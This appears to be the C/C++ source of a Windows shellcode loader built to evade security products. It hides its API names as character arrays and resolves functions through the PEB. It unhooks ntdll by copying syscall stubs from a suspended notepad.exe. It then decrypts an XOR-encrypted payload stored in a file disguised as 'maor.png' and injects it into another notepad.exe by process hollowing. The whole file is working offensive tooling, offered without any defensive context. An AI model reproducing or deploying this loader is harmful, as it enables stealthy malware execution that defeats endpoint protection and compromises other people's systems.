#include <windows.h>
#include <stdio.h>
#include "addresshunter.h"
#include "functions.h"

#define STATUS_SUCCESS 0
#define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )

char KEY[] = "dfgnuidfgdfvmdfvnfuipdsrmfeujinvfhddsclmdosiniujvf";

void XOR(unsigned char* data, size_t data_len, char* key, size_t key_len) {
	int j;

	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}

void sleep()
{
	for (int i = 0; i <= 500000; i++)
	{
		for (int j = 2; j <= i / 2; j++)
		{
			if (i % j == 0)
			{
				break;
			}
		}
	}
}

PVOID CopyMemoryEx(_Inout_ PVOID Destination, _In_ CONST PVOID Source, _In_ SIZE_T Length)
{
	PBYTE D = (PBYTE)Destination;
	PBYTE S = (PBYTE)Source;

	while (Length--)
		*D++ = *S++;

	return Destination;
}

char* strstrFunc(const char* string, const char* substring)
{
	const char* a, * b;

	/* First scan quickly through the two strings looking for a
	 * single-character match.  When it's found, then compare the
	 * rest of the substring.
	 */

	b = substring;

	if (*b == 0)
	{
		return (char*)string;
	}

	for (; *string != 0; string += 1)
	{
		if (*string != *b)
		{
			continue;
		}

		a = string;

		while (1)
		{
			if (*b == 0)
			{
				return (char*)string;
			}
			if (*a++ != *b++)
			{
				break;
			}
		}

		b = substring;
	}

	return NULL;
}

PVOID GetDll(PWSTR FindName)
{
	_PPEB ppeb = (_PPEB)__readgsqword(0x60);
	ULONG_PTR pLdr = (ULONG_PTR)ppeb->pLdr;
	ULONG_PTR val1 = (ULONG_PTR)((PPEB_LDR_DATA)pLdr)->InMemoryOrderModuleList.Flink;
	PVOID dllBase = NULL;

	ULONG_PTR val2;
	while (val1)
	{
		PWSTR DllName = ((PLDR_DATA_TABLE_ENTRY)val1)->BaseDllName.pBuffer;
		dllBase = (PVOID)((PLDR_DATA_TABLE_ENTRY)val1)->DllBase;
		if (my_strcmp((char*)FindName, (char*)DllName) == 0)
		{
			break;
		}
		val1 = DEREF_64(val1);
	}
	return dllBase;
}

//Following functions are copied from HellsGate : https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c

BOOL GetImageExportDirectory(PVOID ntdllBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory)
{
	//Get DOS header
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
	if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		return FALSE;
	}

	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)ntdllBase + pImageDosHeader->e_lfanew);
	if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}
	// Get the EAT
	*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)ntdllBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
	return TRUE;
}

PVOID GetTableEntry(PVOID ntdllBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, CHAR* findfunction)
{
	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)ntdllBase + pImageExportDirectory->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)ntdllBase + pImageExportDirectory->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)ntdllBase + pImageExportDirectory->AddressOfNameOrdinals);
	PVOID funcAddress = 0x00;
	for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
		PCHAR pczFunctionName = (PCHAR)((PBYTE)ntdllBase + pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)ntdllBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

		if (my_strcmp(findfunction, pczFunctionName) == 0)
		{
			WORD cw = 0;
			while (TRUE)
			{
				if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
				{
					return 0x00;
				}

				// check if ret, in this case we are also probaly too far
				if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
				{
					return 0x00;
				}

				if (*((PBYTE)pFunctionAddress + cw) == 0x4c
					&& *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
					&& *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
					&& *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
					&& *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
					&& *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
					BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
					BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
					WORD syscall = (high << 8) | low;
					return pFunctionAddress;
					break;
				}
				cw++;
			}
		}
	}
	return funcAddress;
}

DWORD protectingMe(PVOID textBase, DWORD flProtect, SIZE_T size)
{
	UINT64 kernel32dll;
	DWORD oldprotect = NULL;

	CHAR NtProtectVirtualMemory_c[] = { 'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
	CHAR LoadLibraryA_c[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0x00 };
	kernel32dll = GetKernel32();
	LOADLIBRARYA LoadLibraryAFunc = (LOADLIBRARYA)GetSymbolAddress((HMODULE)kernel32dll, LoadLibraryA_c);
	HMODULE ntdlldll = LoadLibraryAFunc("ntdll.dll");

	NtProtectVirtualMemory_t NtProtectVirtualMemoryFunc = (NtProtectVirtualMemory_t)GetSymbolAddress((HANDLE)ntdlldll, NtProtectVirtualMemory_c);

	NtProtectVirtualMemoryFunc(NtCurrentProcess(), &textBase, (PULONG)&size, flProtect, &oldprotect);
	return oldprotect;
}

void WhatsOverwriting(PVOID ntdllBase, PVOID freshntDllBase, PIMAGE_EXPORT_DIRECTORY hooked_pImageExportDirectory, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PIMAGE_SECTION_HEADER textsection)
{
	UINT64 msvcrtdll, LoadLibraryAFunc, kernel32dll;
	kernel32dll = GetKernel32();
	CHAR loadlibrarya_c[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0x00 };
	CHAR msvcrt_c[] = { 'm', 's', 'v', 'c', 'r', 't', '.', 'd', 'l', 'l', 0x00 };

	LoadLibraryAFunc = GetSymbolAddress((HANDLE)kernel32dll, loadlibrarya_c);
	msvcrtdll = (UINT64)((LOADLIBRARYA)LoadLibraryAFunc)(msvcrt_c);


	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)ntdllBase + hooked_pImageExportDirectory->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)ntdllBase + hooked_pImageExportDirectory->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)ntdllBase + hooked_pImageExportDirectory->AddressOfNameOrdinals);

	for (WORD cx = 0; cx < hooked_pImageExportDirectory->NumberOfNames; cx++) {
		PCHAR pczFunctionName = (PCHAR)((PBYTE)ntdllBase + pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)ntdllBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

		if (strstrFunc(pczFunctionName, (CHAR*)"Nt") != NULL)
		{
			PVOID funcAddress = GetTableEntry(freshntDllBase, pImageExportDirectory, pczFunctionName);
			if (funcAddress != 0x00 && my_strcmp((CHAR*)"NtAccessCheck", pczFunctionName) != 0)
			{
				//Change the write permissions of the .text section of the ntdll in memory
				DWORD oldprotect = protectingMe((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)textsection->VirtualAddress), PAGE_EXECUTE_WRITECOPY, textsection->Misc.VirtualSize);
				//Copy the syscall stub from the fresh ntdll.dll to the hooked ntdll
				CopyMemoryEx((LPVOID)pFunctionAddress, (LPVOID)funcAddress, 23);
				//Change back to the old permissions
				protectingMe((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)textsection->VirtualAddress), oldprotect, textsection->Misc.VirtualSize);
			}
		}
	}
}

void SomeReplacing(PVOID ntdllBase, PVOID freshntDllBase, PIMAGE_SECTION_HEADER textsection)
{
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;

    if (!GetImageExportDirectory(freshntDllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
		{}
		
    
        

    PIMAGE_EXPORT_DIRECTORY hooked_pImageExportDirectory = NULL;
    if (!GetImageExportDirectory(ntdllBase, &hooked_pImageExportDirectory) || hooked_pImageExportDirectory == NULL)
	{}

    WhatsOverwriting(ntdllBase, freshntDllBase, hooked_pImageExportDirectory, pImageExportDirectory, textsection);
}




extern "C" void exec() {

	// Function names
	CHAR NtAllocatedVirtualMemory_c[] = { 'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
	CHAR NtProtectVirtualMemory_c[] = { 'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
	CHAR NtWriteVirtualMemroy_c[] = { 'N', 't', 'W', 'r', 'i', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
	CHAR LoadLibraryA_c[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0x00 };
	CHAR NtReadVirtualMemeory_c[] = { 'N', 't', 'R', 'e', 'a', 'd', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
	CHAR CreateProcessA_c[] = { 'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'A', 0x00 };
	CHAR TerminateProcess_c[] = {'T', 'e', 'r', 'm', 'i', 'n', 'a', 't', 'e','P','r','o','c','e','s','s', 0x00};
	CHAR CloseHandle_c[] = { 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0x00 };
	CHAR CreateFileA_c[] = { 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'l', 'e', 'A', 0x00 };
	CHAR GetFileSize_c[] = { 'G', 'e', 't', 'F', 'i', 'l', 'e', 'S', 'i', 'z', 'e', 0x00 };
	CHAR ReadFile_c[] = { 'R', 'e', 'a', 'd', 'F', 'i', 'l', 'e', 0x00 };
	CHAR GetThreadContext_c[] = { 'G', 'e', 't', 'T', 'h', 'r', 'e', 'a', 'd', 'C', 'o', 'n', 't', 'e', 'x', 't', 0x00 };
	CHAR SetThreadContext_c[] = { 'S', 'e', 't', 'T', 'h', 'r', 'e', 'a', 'd', 'C', 'o', 'n', 't', 'e', 'x', 't', 0x00 };
	CHAR ResumeThread_c[] = { 'R', 'e', 's', 'u', 'm', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 0x00 };
	CHAR Sleep_c[] = { 'S', 'l', 'e', 'e', 'p', 0x00 };
	CHAR wprintf_c[] = { 'w', 'p', 'r', 'i', 'n', 't', 'f', 0x00 };
	
	NTSTATUS status = NULL;

	UINT64 kernel32dll = GetKernel32();
	//Kernel32 Function
	CreateProcessA_t CreateProcessAFunc = (CreateProcessA_t)GetSymbolAddress((HANDLE)kernel32dll, CreateProcessA_c);
	TerminateProcess_t TerminateProcessFunc = (TerminateProcess_t)GetSymbolAddress((HANDLE)kernel32dll, TerminateProcess_c);
	CloseHandle_t CloseHandleFunc = (CloseHandle_t)GetSymbolAddress((HANDLE)kernel32dll, CloseHandle_c);
	CreateFileA_t CreateFileAFunc = (CreateFileA_t)GetSymbolAddress((HANDLE)kernel32dll, CreateFileA_c);
	GetFileSize_t GetFileSizeFunc = (GetFileSize_t)GetSymbolAddress((HANDLE)kernel32dll, GetFileSize_c);
	ReadFile_t ReadFileFunc = (ReadFile_t)GetSymbolAddress((HANDLE)kernel32dll, ReadFile_c);
	GetThreadContext_t GetThreadContextFunc = (GetThreadContext_t)GetSymbolAddress((HANDLE)kernel32dll, GetThreadContext_c);
	SetThreadContext_t SetThreadContextFunc = (SetThreadContext_t)GetSymbolAddress((HANDLE)kernel32dll, SetThreadContext_c);
	Sleep_t SleepFunc = (Sleep_t)GetSymbolAddress((HANDLE)kernel32dll, Sleep_c);
	ResumeThread_t ResumeThreadFunc = (ResumeThread_t)GetSymbolAddress((HANDLE)kernel32dll, ResumeThread_c);

	//Nt Functions
	LOADLIBRARYA LoadLibraryAFunc = (LOADLIBRARYA)GetSymbolAddress((HMODULE)kernel32dll, LoadLibraryA_c);
	HMODULE ntdlldll = LoadLibraryAFunc("ntdll.dll");
	NtAllocateVirtualMemory_t NtAllocatedVirtualMemoryFunc = (NtAllocateVirtualMemory_t)GetSymbolAddress((HANDLE)ntdlldll, NtAllocatedVirtualMemory_c);
	NtProtectVirtualMemory_t NtProtectVirtualMemoryFunc = (NtProtectVirtualMemory_t)GetSymbolAddress((HANDLE)ntdlldll, NtProtectVirtualMemory_c);
	NtWriteVirtualMemroy_t NtWriteVirtualMemroyFunc = (NtWriteVirtualMemroy_t)GetSymbolAddress((HANDLE)ntdlldll, NtWriteVirtualMemroy_c);
	NtReadVirtualMemory_t NtReadVirtualMemoryFunc = (NtReadVirtualMemory_t)GetSymbolAddress((HANDLE)ntdlldll, NtReadVirtualMemeory_c);

	//msvcrt Function
	wprintf_t wprintfFunc = (wprintf_t)GetSymbolAddress((HANDLE)LoadLibraryAFunc("msvcrt.dll"), wprintf_c);

	// ntdll unhooking
	STARTUPINFO siSuspended;
	PROCESS_INFORMATION piSuspended;
	ZeroMemory(&siSuspended, sizeof(siSuspended));
	siSuspended.cb = sizeof(siSuspended);
	ZeroMemory(&piSuspended, sizeof(piSuspended));

	BOOL flag = CreateProcessAFunc(
		NULL,
		(LPSTR)"notepad.exe",
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
		NULL,
		"C:\\Windows\\System32\\",
		(LPSTARTUPINFOA)&siSuspended,
		&piSuspended
	);
	WCHAR createdSuspendedProcess[] = { L'[', L'+', L']', L' ', L'C', L'r', L'e', L'a', L't', L'e', L'd', L' ', L'S', L'u', L's', L'p', L'e', L'n', L'd', L'e', L'd', L' ', L'p', L'r', L'o', L'c', L'e', L's', L's', L'.', L'.',  L'\n', 0x00 };
	wprintfFunc(createdSuspendedProcess);
	WCHAR findname[] = L"ntdll.dll\x00";

	PVOID ntdllBase = GetDll(findname);
	
	PIMAGE_DOS_HEADER ImgDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
	PIMAGE_NT_HEADERS ImgNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + (ImgDosHeader->e_lfanew));
	IMAGE_OPTIONAL_HEADER OptHeader = (IMAGE_OPTIONAL_HEADER)ImgNTHeaders->OptionalHeader;
	PIMAGE_SECTION_HEADER textsection = IMAGE_FIRST_SECTION(ImgNTHeaders);

	SIZE_T ntdllSize = OptHeader.SizeOfImage;

	LPVOID freshNtdll = NULL;
	status = NtAllocatedVirtualMemoryFunc(
		NtCurrentProcess(),
		&freshNtdll,
		NULL,
		&ntdllSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE
	);
	if (status != STATUS_SUCCESS) {
		WCHAR failedToAllocate[] = { L'[', L'-', L']', L' ', L'F', L'a', L'i', L'l', L'e', L'd', L' ', L't', L'o', L' ', L'a', L'l', L'l', L'o', L'c', L'a', L't', L'e', L' ', L'm', L'e', L'm', L'o', L'r', L'y', L' ', L'f', L'o', L'r', L' ', L't', L'h', L'e', L' ', L'u', L'n', L'h', L'o', L'o', L'k', L'i', L'n', L'g', L'.', L'.',  L'\n', 0x00 };
		wprintfFunc(failedToAllocate);
		return;
	}

	WCHAR AllocatedMemrory[] = { L'[', L'+', L']', L' ', L'A', L'l', L'l', L'o', L'c', L'a', L't', L'e', L'd', L' ', L'v', L'i', L'r', L't', L'u', L'a', L'l', L' ', L'm', L'e', L'm', L'o', L'r', L'y', L' ', L'o', L'f', L' ', L'n', L'o', L't', L'e', L'p', L'a', L'd', L'.', L'e', L'x', L'e',  L'\n', 0x00 };
	wprintfFunc(AllocatedMemrory);

	DWORD bytesread = NULL;
	status = NtReadVirtualMemoryFunc(
		piSuspended.hProcess,
		ntdllBase,
		freshNtdll,
		ntdllSize,
		&bytesread
	);
	if (status != STATUS_SUCCESS) {
		WCHAR failedToReadVirtual[] = { L'[', L'-', L']', L' ', L'F', L'a', L'i', L'l', L'e', L'd', L' ', L't', L'o', L' ', L'r', L'e', L'a', L'd', L' ', L'v', L'i', L'r', L't', L'u', L'a', L'l', L' ', L'm', L'e', L'm', L'o', L'r', L'y', L'!',  L'\n', 0x00 };
		wprintfFunc(failedToReadVirtual);
		return;
	}

	SomeReplacing(ntdllBase, freshNtdll, textsection);
	
	TerminateProcessFunc(piSuspended.hProcess, 0);
	CloseHandleFunc(piSuspended.hProcess);
	CloseHandleFunc(piSuspended.hThread);

	WCHAR finishedReplace[] = { L'[', L'+', L']', L' ', L'F', L'i', L'n', L'i', L's', L'h', L'e', L'd', L' ', L'r', L'e', L'p', L'l', L'a', L'c', L'e', L' ', L'n', L't', L'd', L'l', L'l', L' ', L'f', L'r', L'o', L'm', L' ', L's', L'u', L's', L'p', L'e', L'n', L'd', L'e', L'd', L' ', L'p', L'r', L'o', L'c', L'e', L's', L's',  L'\n', 0x00 };
	wprintfFunc(finishedReplace);

	// Process Hollowing
	HANDLE hFile = CreateFileAFunc(
		"maor.png", // change it to the file name of the encrypted shellcode
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (hFile == INVALID_HANDLE_VALUE) {
		WCHAR invaliaHandle[] = { L'[', L'-', L']', L' ', L'I', L'n', L'v', L'a', L'l', L'i', L'd', L' ', L'H', L'a', L'n', L'd', L'l', L'e', L' ', L'V', L'a', L'l', L'u', L'e',  L'\n', 0x00 };
		wprintfFunc(invaliaHandle);
		return;
	}

	SIZE_T fileSize = GetFileSizeFunc(hFile, NULL);

	LPVOID fileData = NULL;
	status = NtAllocatedVirtualMemoryFunc(
		NtCurrentProcess(),
		&fileData,
		NULL,
		&fileSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE
	);
	if (fileData == NULL) {
		WCHAR failedToAllocate[] = { L'[', L'-', L']', L' ', L'F', L'a', L'i', L'l', L'e', L'd', L' ', L't', L'o', L' ', L'a', L'l', L'l', L'o', L'c', L'a', L't', L'e', L' ', L'm', L'e', L'm', L'o', L'r', L'y', L' ', L'f', L'o', L'r', L' ', L's', L'h', L'e', L'l', L'l', L'c', L'o', L'd', L'e', L'.',  L'\n', 0x00 };
		wprintfFunc(failedToAllocate);
		return;
	}

	DWORD BytesRead = NULL;

	flag = ReadFileFunc(
		hFile,
		fileData,
		fileSize,
		&BytesRead,
		NULL
	);
	if (!flag) {
		WCHAR errorReadFile[] = { L'[', L'-', L']', L' ', L'E', L'r', L'r', L'o', L'r', L' ', L'r', L'e', L'a', L'd', L'i', L'n', L'g', L' ', L't', L'h', L'e', L' ', L'f', L'i', L'l', L'e', L'!', L' ',  L'\n', 0x00 };
		wprintfFunc(errorReadFile);
		return;
	}

	WCHAR readShellcode[] = { L'[', L'+', L']', L' ', L'R', L'e', L'a', L'd', L' ', L's', L'h', L'e', L'l', L'l', L'c', L'o', L'd', L'e', L' ', L'f', L'i', L'l', L'e', L'!',  L'\n', 0x00 };
	wprintfFunc(readShellcode);

	unsigned char* shellcode = (unsigned char*)fileData;

	STARTUPINFOA si = {
		sizeof(si)
	};
	PROCESS_INFORMATION pi;
	
	flag = CreateProcessAFunc(
		"c:\\windows\\system32\\notepad.exe",
		NULL,
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		(LPSTARTUPINFOA)&si,
		&pi
	);

	if (!flag) {
		WCHAR errorCreateProcess[] = { L'[', L'-', L']', L' ', L'E', L'r', L'r', L'o', L'r', L' ', L'c', L'r', L'e', L'a', L't', L'i', L'n', L'g', L' ', L'p', L'r', L'o', L'c', L'e', L's', L's', L'.', L'.',  L'\n', 0x00 };
		wprintfFunc(errorCreateProcess);
		return;
	}

	LPVOID exec = NULL;

	status = NtAllocatedVirtualMemoryFunc(
		pi.hProcess,
		&exec,
		NULL,
		&fileSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE
	);
	if (status != STATUS_SUCCESS) {
		WCHAR failedToAllocatememory[] = { L'[', L'-', L']', L' ', L'F', L'a', L'i', L'l', L'e', L'd', L' ', L't', L'o', L' ', L'a', L'l', L'l', L'o', L'c', L'a', L't', L'e', L' ', L'm', L'e', L'm', L'o', L'r', L'y', L'!',  L'\n', 0x00 };
		wprintfFunc(failedToAllocatememory);
		return;
	}

	WCHAR allocatedMemory[] = { L'[', L'+', L']', L' ', L'A', L'l', L'l', L'o', L'c', L'a', L't', L'e', L'd', L' ', L'M', L'e', L'm', L'o', L'r', L'y', L'!',  L'\n', 0x00 };
	wprintfFunc(allocatedMemory);

	XOR(shellcode, fileSize, KEY, sizeof(KEY));
	WCHAR decryptedshellcode[] = { L'[', L'+', L']', L' ', L'D', L'e', L'c', L'r', L'y', L'p', L't', L'e', L'd', L' ', L's', L'h', L'e', L'l', L'l', L'c', L'o', L'd', L'e', L' ', L'f', L'i', L'l', L'e', L'!',  L'\n', 0x00 };
	wprintfFunc(decryptedshellcode);

	DWORD oldprotect = NULL;

	status = NtProtectVirtualMemoryFunc(pi.hProcess, &exec, (PULONG)&fileSize, PAGE_EXECUTE_READWRITE, &oldprotect);
	if (status != STATUS_SUCCESS) {
		WCHAR failedToProtect[] = { L'[', L'-', L']', L' ', L'F', L'a', L'i', L'l', L'e', L'd', L' ', L't', L'o', L' ', L'p', L'r', L'o', L't', L'e', L'c', L't', L' ', L'm', L'e', L'm', L'o', L'r', L'y', L'!',  L'\n', 0x00 };
		wprintfFunc(failedToProtect);
		return;
	}
	WCHAR protectedMemory[] = { L'[', L'+', L']', L' ', L'P', L'r', L'o', L't', L'e', L'c', L't', L'e', L'd', L' ', L'M', L'e', L'm', L'o', L'r', L'y', L'!',  L'\n', 0x00 };
	wprintfFunc(protectedMemory);


	status = NtWriteVirtualMemroyFunc(pi.hProcess, exec, shellcode, fileSize, NULL);
	if (status != STATUS_SUCCESS) {
		WCHAR failedToWrite[] = { L'[', L'-', L']', L' ', L'F', L'a', L'i', L'l', L'e', L'd', L' ', L't', L'o', L' ', L'w', L'r', L'i', L't', L'e', L' ', L'm', L'e', L'm', L'o', L'r', L'y', L'!',  L'\n', 0x00 };
		wprintfFunc(failedToWrite);
		return;
	}

	WCHAR payloadWritten[] = { L'[', L'+', L']', L' ', L'P', L'a', L'y', L'l', L'o', L'a', L'd', L' ', L'w', L'r', L'i', L't', L't', L'e', L'n', L'!',  L'\n', 0x00 };
	wprintfFunc(payloadWritten);

	CONTEXT CT;
	CT.ContextFlags = CONTEXT_FULL;

	if (!GetThreadContextFunc(pi.hThread, &CT)) {
		WCHAR failedGetThread[] = { L'[', L'-', L']', L' ', L'F', L'a', L'i', L'l', L'e', L'd', L' ', L't', L'o', L' ', L'g', L'e', L't', L' ', L'T', L'h', L'r', L'e', L'a', L'd', L' ', L'C', L'o', L'n', L't', L'e', L'x', L't',  L'\n', 0x00 };
		wprintfFunc(failedGetThread);
		return;
	}

	CT.Rip = (DWORD64)exec;

	if (!SetThreadContextFunc(pi.hThread, &CT)) {
		WCHAR errorSettingThread[] = { L'[', L'-', L']', L' ', L'E', L'r', L'r', L'o', L'r', L' ', L's', L'e', L't', L't', L'i', L'n', L'g', L' ', L't', L'h', L'r', L'e', L'a', L'd', L' ', L'c', L'o', L'n', L't', L'e', L'x', L't',  L'\n', 0x00 };
		wprintfFunc(errorSettingThread);
		return;
	}

	WCHAR Sleeping[] = { L'[', L'+', L']', L' ', L'S', L'l', L'e', L'e', L'p', L'i', L'n', L'g', L' ', L'5', L' ', L's', L'e', L'c', L'o', L'n', L'd', L's', L'.', L'.',  L'\n', 0x00 };
	wprintfFunc(Sleeping);

	SleepFunc(5);

	ResumeThreadFunc(pi.hThread);

	WCHAR success[] = { L'[', L'+', L']', L' ', L'P', L'r', L'o', L'c', L'e', L's', L's', L' ', L'h', L'o', L'l', L'l', L'o', L'w', L'i', L'n', L'g', L' ', L's', L'u', L'c', L'c', L'e', L's', L's', L'f', L'u', L'l', L'!',  L'\n', 0x00 };
	wprintfFunc(success);

	CloseHandleFunc(hFile);
	CloseHandleFunc(pi.hProcess);
	CloseHandleFunc(pi.hThread);
}